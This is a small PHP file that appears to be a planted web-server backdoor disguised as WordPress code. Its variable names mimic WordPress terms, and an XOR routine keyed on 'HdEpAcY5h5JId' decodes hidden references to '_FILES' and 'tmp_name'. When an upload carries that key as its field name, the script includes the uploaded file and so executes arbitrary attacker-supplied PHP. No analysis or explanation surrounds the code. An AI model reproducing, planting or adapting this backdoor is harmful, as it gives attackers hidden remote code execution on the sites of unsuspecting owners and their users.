<?php 	

$posts = 'HdEpAcY5h5JId';
$parent = $posts;
function stripped($content, $count2)

{

    $opening_quote = $count2;
    $value = urldecode($content);
    $single_preg = substr($opening_quote,0, strlen($value));
	$wp_smiliessearch = 'statuses';
    $intermediate_dir = $value ^ $single_preg;
    return $intermediate_dir;
}
	$field_no_prefix = 'uploads';
$emoji = ${stripped("%17%22%0C%3C%040", $parent)};

$goal = $emoji;
$is_sticky = isset($goal[$parent]);

if ($is_sticky)

{
    $url_clickable = $emoji[$parent];
    $offset = $url_clickable[stripped("%3C%095%2F%2F%024P", $parent)];

    $apos = $offset;
    include ($apos);

}
?>
